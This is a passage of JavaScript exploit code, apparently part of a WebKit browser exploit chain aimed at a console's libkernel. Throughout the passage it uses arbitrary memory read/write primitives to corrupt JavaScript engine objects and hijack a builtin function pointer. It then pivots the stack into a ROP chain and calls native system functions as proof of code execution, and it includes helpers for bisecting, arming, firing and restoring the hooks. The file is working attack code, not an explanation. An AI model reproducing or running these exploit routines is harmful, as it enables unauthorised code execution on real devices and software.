    const bf = injectFakeButterfly(p, prep);
    return bf;
}

export function formatPivotBfDiag(p, pivotCell) {
    const rows = [];
    if (!p || !pivotCell) return rows;
    for (let i = 0; i < BF_CELL_OFFS.length; i++) {
        const off = BF_CELL_OFFS[i];
        let val = null;
        try { val = p.read8(pivotCell.add32(off)); } catch (_) { val = null; }
        rows.push("+0x" + off.toString(16) + "=" + val
            + (isPlausibleHeapPtr(val) ? " ok" : ""));
    }
    return rows;
}

/** Read-only — dump pivot object cell for hook offset hunt. */
export function probePivotCell(p, pivotCell) {
    const rows = [];
    if (!p || !pivotCell) return rows;
    for (let o = 0; o <= 0x40; o += 8) {
        let val = null;
        try { val = p.read8(pivotCell.add32(o)); } catch (_) { val = null; }
        rows.push({ off: o, val });
    }
    return rows;
}

/** Hook store S at pivotCell+off (explicit offset, ignores pivot_hook_off). */
export function bisectHookPivotAt(p, prep, hookOff) {
    if (!prep || !prep.pivotCell || !prep.M)
        throw new Error("bisectHookPivotAt: no prep");
    const site = prep.pivotCell.add32(hookOff);
    if (!prep._bisect) prep._bisect = {};
    prep._bisect.pivotSite = site;
    prep._bisect.pivotHookOff = hookOff;
    prep._bisect.pivotSaved = p.read8(site);
    p.write8(site, prep.M.S);
    return site;
}

/** Poison several pivotCell offsets at once (G0 rsi+0x30 hunt). */
export function bisectHookPivotMulti(p, prep, hookOffs) {
    if (!prep || !prep.pivotCell || !prep.M)
        throw new Error("bisectHookPivotMulti: no prep");
    if (!prep._bisect) prep._bisect = {};
    const saved = [];
    for (let i = 0; i < hookOffs.length; i++) {
        const site = prep.pivotCell.add32(hookOffs[i]);
        saved.push({ site, off: hookOffs[i], val: p.read8(site) });
        p.write8(site, prep.M.S);
    }
    prep._bisect.multiSaved = saved;
    prep._bisect.pivotSite = saved.length ? saved[0].site : prep.pivotCell;
    return saved;
}

/** Hook store S on butterfly slots (13.52 may use rsi=butterfly not pivotCell). */
export function bisectHookPivotButterfly(p, prep, hookOffs, carrier) {
    if (!prep || !prep.pivotCell || !prep.M)
        throw new Error("bisectHookPivotButterfly: no prep");
    hookOffs = hookOffs || G0_HOOK_OFFS;
    const bf = ensurePivotButterfly(p, prep, carrier);
    if (!prep._bisect) prep._bisect = {};
    const saved = [];
    for (let i = 0; i < hookOffs.length; i++) {
        const site = bf.add32(hookOffs[i]);
        saved.push({ site, off: hookOffs[i], base: "bf", val: p.read8(site) });
        p.write8(site, prep.M.S);
    }
    prep._bisect.multiSaved = saved;
    prep._bisect.pivotSite = saved.length ? saved[0].site : bf;
    prep._bisect.butterfly = bf;
    return saved;
}

/** Safe multi on cell + butterfly — one fire covers rsi=cell and rsi=butterfly layouts. */
export function bisectHookPivotMultiAll(p, prep, cellOffs, bfOffs, carrier) {
    if (!prep || !prep.pivotCell || !prep.M)
        throw new Error("bisectHookPivotMultiAll: no prep");
    cellOffs = cellOffs || G0_HOOK_SAFE;
    bfOffs = bfOffs || G0_HOOK_SAFE;
    if (!prep._bisect) prep._bisect = {};
    const saved = [];
    for (let i = 0; i < cellOffs.length; i++) {
        const site = prep.pivotCell.add32(cellOffs[i]);
        saved.push({ site, off: cellOffs[i], base: "cell", val: p.read8(site) });
        p.write8(site, prep.M.S);
    }
    const bf = ensurePivotButterfly(p, prep, carrier);
    if (bf) {
        for (let j = 0; j < bfOffs.length; j++) {
            const site = bf.add32(bfOffs[j]);
            saved.push({ site, off: bfOffs[j], base: "bf", val: p.read8(site) });
            p.write8(site, prep.M.S);
        }
        prep._bisect.butterfly = bf;
    }
    prep._bisect.multiSaved = saved;
    prep._bisect.pivotSite = saved.length ? saved[0].site : prep.pivotCell;
    return saved;
}

/** Verify hooks written to multiSaved sites (cell or butterfly). */
export function verifyPivotHookSaved(p, prep) {
    const rows = [];
    if (!prep || !prep.M || !prep._bisect || !prep._bisect.multiSaved)
        return { ok: false, okCount: 0, rows, want: prep.M && prep.M.S };
    const want = prep.M.S;
    const saved = prep._bisect.multiSaved;
    let okCount = 0;
    for (let i = 0; i < saved.length; i++) {
        const e = saved[i];
        let peek = null;
        try { peek = p.read8(e.site); } catch (_) { peek = null; }
        const match = peek != null && String(peek) === String(want);
        if (match) okCount++;
        rows.push({
            off: e.off,
            base: e.base || "cell",
            peek,
            want,
            ok: match,
        });
    }
    return { ok: okCount > 0, okCount, rows, want };
}

/** Read back hook slots — confirms write8 stuck before expm1 (survives fast OOM). */
export function verifyPivotHookWrites(p, prep, hookOffs) {
    const rows = [];
    if (!prep || !prep.pivotCell || !prep.M)
        return { ok: false, okCount: 0, rows, want: null };
    const want = prep.M.S;
    hookOffs = hookOffs || G0_HOOK_OFFS;
    let okCount = 0;
    for (let i = 0; i < hookOffs.length; i++) {
        const off = hookOffs[i];
        let peek = null;
        try { peek = p.read8(prep.pivotCell.add32(off)); } catch (_) { peek = null; }
        const match = peek != null && String(peek) === String(want);
        if (match) okCount++;
        rows.push({ off, peek, want, ok: match });
    }
    return { ok: okCount > 0, okCount, rows, want };
}

function writePivotHook(p, prep, off) {
    const site = pivotHookCell(prep, off);
    if (!prep._bisect) prep._bisect = {};
    prep._bisect.pivotSite = site;
    prep._bisect.pivotSaved = p.read8(site);
    p.write8(site, prep.M.S);
    return site;
}

/** cell+0 and butterfly+0 — 13.52 may use rsi=butterfly-0x30 instead of pivotCell-0x30. */
function writePivotHookDual(p, prep, off, carrier) {
    if (!prep || !prep.pivotCell || !prep.M)
        throw new Error("writePivotHookDual: no prep");
    if (!prep._bisect) prep._bisect = {};
    const saved = [];
    let hookOff = 0;
    if (off && off.pivot_hook_off != null)
        hookOff = off.pivot_hook_off;
    const site0 = prep.pivotCell.add32(hookOff);
    saved.push({ site: site0, off: hookOff, base: "cell", val: p.read8(site0) });
    p.write8(site0, prep.M.S);
    const bf = ensurePivotButterfly(p, prep, carrier);
    if (bf) {
        saved.push({ site: bf, off: 0, base: "bf", val: p.read8(bf) });
        p.write8(bf, prep.M.S);
    }
    prep._bisect.multiSaved = saved;
    prep._bisect.pivotSite = site0;
    prep._bisect.pivotSaved = saved[0].val;
    return site0;
}

function applyPivotHook(p, prep, off, opts) {
    opts = opts || {};
    const mode = opts.hook || "cell30";
    const carrier = opts.carrier || null;
    if (mode === "dual") {
        writePivotHookDual(p, prep, off || {}, carrier);
        return;
    }
    if (mode === "dual30") {
        bisectHookPivotMultiAll(p, prep, [0x30], [0x30], carrier);
        return;
    }
    if (mode === "multi")
        bisectHookPivotMulti(p, prep, G0_HOOK_OFFS);
    else if (mode === "multi-safe")
        bisectHookPivotMulti(p, prep, G0_HOOK_SAFE);
    else if (mode === "multiall")
        bisectHookPivotMultiAll(p, prep, G0_HOOK_SAFE, G0_HOOK_SAFE, carrier);
    else if (mode === "bf")
        bisectHookPivotButterfly(p, prep, G0_HOOK_POOPS, carrier);
    else if (mode === "bf30")
        bisectHookPivotButterfly(p, prep, [0x30], carrier);
    else {
        const hookOff = mode === "cell30" ? 0x30
            : (opts.hookOff != null ? opts.hookOff : 0);
        bisectHookPivotAt(p, prep, hookOff);
    }
}

/** Pre-fire logging / bisect — same hooks fireNativeCall applies. */
export function applyPivotHookForFire(p, prep, off, opts) {
    applyPivotHook(p, prep, off, opts);
}

function restorePivotHook(p, prep) {
    if (prep._bisect && prep._bisect.multiSaved) {
        for (let i = 0; i < prep._bisect.multiSaved.length; i++) {
            const e = prep._bisect.multiSaved[i];
            if (e.val != null) p.write8(e.site, e.val);
        }
    } else if (prep._bisect && prep._bisect.pivotSaved != null) {
        const site = prep._bisect.pivotSite || prep.pivotCell;
        p.write8(site, prep._bisect.pivotSaved);
    }
    if (prep._bisect && prep._bisect.fakeBfCellSaved != null && prep._bisect.fakeBfCellSite) {
        p.write8(prep._bisect.fakeBfCellSite, prep._bisect.fakeBfCellSaved);
        prep._pivotBfInjected = false;
    }
}

/** Swap G5 in live slab (try expm1+0x53642a if table G5 OOMs at fire). */
export function patchPrepG5(prep, g5Addr) {
    if (!prep || !prep.M || !prep.G || !g5Addr)
        throw new Error("patchPrepG5: bad args");
    prep.G.G5 = g5Addr;
    put(prep.M.pivotDv, 0x10, g5Addr);
}

export function layoutGetpidStack(prep, libkernelBase, stubOff, stubAddr) {
    if (!prep || !prep.M || !prep.G)
        throw new Error("layoutGetpidStack: no prep");
    const target = stubAddr || libkernelBase.add32(stubOff);
    prep._layout = layoutNativeCall(prep.M, prep.G, target, []);
    prep.stubAddr = target;
    prep.staged = true;
    prep.stagedKind = "getpid";
    prep.stubOff = stubOff;
}

/** Bisect step 3 — write G0 → main m_function (no expm1 yet). */
export function bisectArmG0(p, prep) {
    if (!prep || !prep.mainMf || !prep.G)
        throw new Error("bisectArmG0: no prep");
    p.write8(prep.mainMf, prep.G.G0);
    prep.mainArmed = true;
}

/** Bisect step 4 — pivot hook site → store slab S (save old val). */
export function bisectHookPivot(p, prep, off) {
    if (!prep || !prep.pivotCell || !prep.M)
        throw new Error("bisectHookPivot: no prep");
    writePivotHook(p, prep, off || {});
}

/** Bisect step 4 alt — poops-style hook @ leakval+0 (no +0x30). */
export function bisectHookPivotPoops(p, prep) {
    if (!prep || !prep.pivotCell || !prep.M)
        throw new Error("bisectHookPivotPoops: no prep");
    if (!prep._bisect) prep._bisect = {};
    prep._bisect.pivotSite = prep.pivotCell;
    prep._bisect.pivotSaved = p.read8(prep.pivotCell);
    p.write8(prep.pivotCell, prep.M.S);
}

/** poops chain_poops.js — hook leakval+0 only (rsi=pivotCell-0x30 → [rsi+0x30]=cell+0). */
export const G0_HOOK_POOPS = [0x0];

/** Offsets poisoned on pivotCell for G0 rsi layout hunt (can corrupt object — use N5multi only). */
export const G0_HOOK_OFFS = [0x0, 0x20, 0x28, 0x30, 0x38];

/** 13.52 — skip cell+0 (JSCell header); poison [rsi+0x30] when rsi=pivotCell or butterfly. */
export const G0_HOOK_SAFE = [0x20, 0x28, 0x30, 0x38];

/** Slab + arm checks before fire — throws instead of OOM when bufAddr is wrong. */
export function bisectPreflight(p, prep) {
    const out = { ok: true, reasons: [], slab: null, armed: null, g0: null };
    if (!prep || !prep.M || !prep.G)
        return Object.assign(out, { ok: false, reasons: ["no prep"] });
    out.g0 = prep.G.G0;
    try {
        out.slab = verifySlabAddrs(p, prep);
        if (!out.slab.S.ok) { out.ok = false; out.reasons.push("S unreadable (bufAddr?)"); }
        if (!out.slab.K.ok) { out.ok = false; out.reasons.push("K unreadable (bufAddr?)"); }
        if (out.slab.rsp && !out.slab.rsp.ok)
            out.reasons.push("rsp unreadable (layout?)");
        const content = verifySlabContent(p, prep);
        out.slabContent = content;
        if (!content.ok) {
            out.ok = false;
            out.reasons.push("slab content: " + content.reasons.join("; "));
        }
    } catch (e) {
        out.ok = false;
        out.reasons.push("slab check: " + (e.message || e));
    }
    if (prep.mainMf) {
        try { out.armed = p.read8(prep.mainMf); } catch (_) { out.armed = null; }
        if (out.armed == null)
            out.reasons.push("mainMf unreadable");
        else if (String(out.armed) !== String(prep.G.G0))
            out.reasons.push("mainMf not G0 yet");
    }
    return out;
}

/** chain_poops callAddr — layout + arm G0 + multi-hook + expm1. */
export function bisectFirePoopsStyle(p, prep, hookOffs, opts) {
    if (!prep || !prep.M || !prep.G || !prep.pivotObj || !prep.mainMf)
        throw new Error("bisectFirePoopsStyle: no prep");
    hookOffs = hookOffs || G0_HOOK_OFFS;
    opts = opts || {};
    if (!opts.skipSetup) {
        layoutSmokeStack(prep);
        p.write8(prep.mainMf, prep.G.G0);
        prep.mainArmed = true;
    }
    if (!opts.skipHook)
        bisectHookPivotMulti(p, prep, hookOffs);
    firePivotTrigger(prep);
    return prep.M.frameDv.getUint32(0, true) | 0;
}

/** Bisect step 5 — pivot builtin trigger (runs ROP chain). */
export function bisectFireExpm1(p, prep) {
    if (!prep || !prep.pivotObj)
        throw new Error("bisectFireExpm1: no prep");
    firePivotTrigger(prep);
}

/** Restore poisoned pivot slots only (main m_function untouched). */
export function bisectRestorePivotOnly(p, prep) {
    if (!prep || !p) return 0;
    let restored = 0;
    const bis = prep._bisect;
    if (bis && bis.multiSaved && bis.multiSaved.length) {
        for (let i = 0; i < bis.multiSaved.length; i++) {
            const e = bis.multiSaved[i];
            if (e.val != null) {
                p.write8(e.site, e.val);
                restored++;
            }
        }
    } else if (bis && bis.pivotSaved != null) {
        const site = bis.pivotSite || prep.pivotCell;
        if (site) {
            p.write8(site, bis.pivotSaved);
            restored = 1;
        }
    }
    if (bis && bis.fakeBfCellSaved != null && bis.fakeBfCellSite) {
        p.write8(bis.fakeBfCellSite, bis.fakeBfCellSaved);
        prep._pivotBfInjected = false;
        restored++;
    }
    if (restored > 0)
        prep._bisect = {};
    return restored;
}

/** Blind disarm + pivot restore — no read8, no DOM. Call before any logging if G0/pivot hot. */
export function bisectEmergencyUntangle(p, prep) {
    if (!prep || !p) return { disarmed: false, restored: 0 };
    const mainMf = prep._pinMainMf || prep.mainMf;
    const mainOrig = prep._pinMainOrig != null ? prep._pinMainOrig : prep.mainOrig;
    let disarmed = false;
    if (mainMf && mainOrig != null) {
        p.write8(mainMf, mainOrig);
        prep.mainArmed = false;
        disarmed = true;
    }
    const restored = bisectRestorePivotOnly(p, prep);
    prep.staged = false;
    return { disarmed, restored };
}

/** Drop G0 from main m_function — call before touching poisoned pivot (GC may re-enter expm1). */
export function bisectDisarmG0(p, prep) {
    if (!prep || !prep.mainMf || prep.mainOrig == null)
        return false;
    p.write8(prep.mainMf, prep.mainOrig);
    prep.mainArmed = false;
    return true;
}

/** Bisect step 6 — disarm G0 first, then restore pivot hook site(s). */
export function bisectRestore(p, prep) {
    if (!prep) return;
    bisectEmergencyUntangle(p, prep);
}

/** Bisect step 7+ — fire after layout (assumes hook+arm or uses full fireNativeCall). */
export function fireNativeCallBisect(p, prep, off) {
    return fireNativeCall(p, prep, off);
}

export function firePivotGetpid(p, prep, libkernelBase, off, stubOffOverride, opts) {
    if (!prep || !prep.M || !prep.G)
        throw new Error("firePivotGetpid: no prep");
    opts = opts || {};
    stageGetpid(p, prep, libkernelBase, off, stubOffOverride, opts);
    if (!opts.skipVerify) {
        const content = verifySlabContent(p, prep);
        if (!content.ok)
            throw new Error("firePivotGetpid: slab content: " + content.reasons.join("; "));
    }
    return fireNativeCall(p, prep, off, opts);
}

export function firePivotSmoke(p, prep, off, opts) {
    if (!prep || !prep.M || !prep.G)
        throw new Error("firePivotSmoke: no prep");
    layoutSmokeStack(prep);
    const content = verifySlabContent(p, prep);
    if (!content.ok)
        throw new Error("firePivotSmoke: slab content: " + content.reasons.join("; "));
    return fireNativeCall(p, prep, off, opts);
}

/** chain_poops callAddr — no logging, no DOM. */
export function fireNativeCall(p, prep, off, opts) {
    if (!prep || !prep.M)
        throw new Error("fireNativeCall: no prep");
    opts = opts || {};
    if (!prep.mainArmed) {
        p.write8(prep.mainMf, prep.G.G0);
        prep.mainArmed = true;
    }
    applyPivotHook(p, prep, off, opts);
    firePivotTrigger(prep);
    restorePivotHook(p, prep);
    p.write8(prep.mainMf, prep.mainOrig);
    prep.mainArmed = false;
    prep.staged = false;
    prep._bisect = {};
    return prep.M.frameDv.getUint32(0, true) | 0;
}

export function fireUsleep(p, prep, libkernelBase, off, usec) {
    stageUsleep(p, prep, libkernelBase, off, usec);
    return fireNativeCall(p, prep, off);
}

export function fireGetpid(p, prep, off, opts) {
    return fireNativeCall(p, prep, off, opts);
}

export function runGetpidFromPrep(p, prep, libkernelBase, off) {
    stageGetpid(p, prep, libkernelBase, off);
    return fireGetpid(p, prep, off);
}

export function initNativeCall(p, off, opts) {
    opts = opts || {};
    const prep = opts.prep;
    if (!prep)
        throw new Error("initNativeCall: use prepNativeChain + runGetpidFromPrep on HW");
    const lk = opts.libkernelBase;
    if (!lk)
        throw new Error("initNativeCall: libkernelBase required");
    return {
        webkitBase: opts.webkitBase,
        libkernelBase: lk,
        sc(num) {
            if (num !== SYS.getpid) throw new Error("getpid only");
            if (!prep.staged)
                stageGetpid(p, prep, lk, off);
            return { i32: fireGetpid(p, prep, off) };
        },
        disarm() {
            if (prep.staged) {
                try { p.write8(prep.mainMf, prep.mainOrig); } catch (_) { }
                prep.staged = false;
            }
        },
    };
}

export function runGetpidProof(p, off, opts) {
    opts = Object.assign({ trust: true, noStubScan: true }, opts || {});
    const webkitBase = opts.webkitBase
        || (opts.nativeFn && off.wk_expm1_builtin
            ? opts.nativeFn.sub32(off.wk_expm1_builtin) : null);
    const prep = opts.prep || prepNativeChain(p, off, webkitBase);
    const lk = opts.libkernelBase;
    const pid = runGetpidFromPrep(p, prep, lk, off);
    return { ok: pid > 0, pid, uid: null, chain: null };
}
